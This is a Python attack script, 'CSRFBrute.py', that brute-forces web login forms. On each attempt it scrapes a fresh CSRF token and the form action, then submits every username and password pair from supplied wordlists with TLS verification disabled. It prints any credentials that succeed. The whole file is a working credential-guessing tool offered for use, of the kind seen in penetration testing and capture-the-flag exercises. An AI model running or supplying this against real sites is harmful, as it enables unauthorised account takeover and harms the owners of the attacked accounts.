import requests
import sys
from bs4 import BeautifulSoup
import uuid
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def getToken(url, request):
    page = requests.get(url, verify=False)
    html_content = page.text
    soup = BeautifulSoup(html_content, features="lxml")
    try:
        title = soup.find('title').text
        csrfname = soup.find('input', attrs={"type": 'hidden'}).get('name')
        token = soup.find('input', {"name": csrfname}).get("value")
        path = soup.find('form', attrs={'name':'login','method': 'post'}).get('action')
        session_id = str(uuid.uuid1()).replace('-', '')

    except AttributeError:
        print("[-] csrf token name/value error")
        sys.exit(1)

    return csrfname, token, title, session_id, path


def connect(username, password, url, csrfname, token, request, org_title, session_id, path):
    print(f'Testing with: {username}/{password}')
    cookies = {"PHPSESSID": session_id}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', }
    data = {
        'username': username,
        'password': password,
        csrfname: token,
    }
    login_request = requests.post(str(url + path), headers=headers, cookies=cookies, data=data, verify=False)
    if org_title not in login_request.text:
        print("[+] Logged in sucessfully")
        return True
    else:
        print("[-] Wrong credentials")
        return False

def printSuccess(username, password):
    print("----------------------------------------------------")
    print()
    print("[*] Credentials: "+username+"/"+password)
    print()


def bruteforcelogin(ip, usernamelist_path, wordlist_path):
    url = 'https://' + ip.strip()
    usernames = str(usernamelist_path.strip())
    passwords = str(wordlist_path.strip())
    print(
        '''
    ##########################################
    |	* CSRFBrute.py                       |
    |	* By D4ni3lTw                        |
    ##########################################
    '''
    )
    if (usernames != None and passwords != None):
        list_usernames = open(usernames, 'r', encoding='UTF-8').readlines()
        list_passwords = open(passwords, 'r', encoding='UTF-8').readlines()
        for user in list_usernames:
            user = user.rstrip('\n')
            for passwd in list_passwords:
                passwd = passwd.rstrip('\n')
                reqSess = requests.session()
                csrfname, token, title, session_id, path = getToken(url, reqSess)
                found = connect(user, passwd, url,
                                csrfname, token, reqSess, title, session_id, path)
                if (found):
                    printSuccess(user, passwd)
                    return user, passwd
    else:
        print('[-] Fail to read username/password wordlist')
        sys.exit(1)
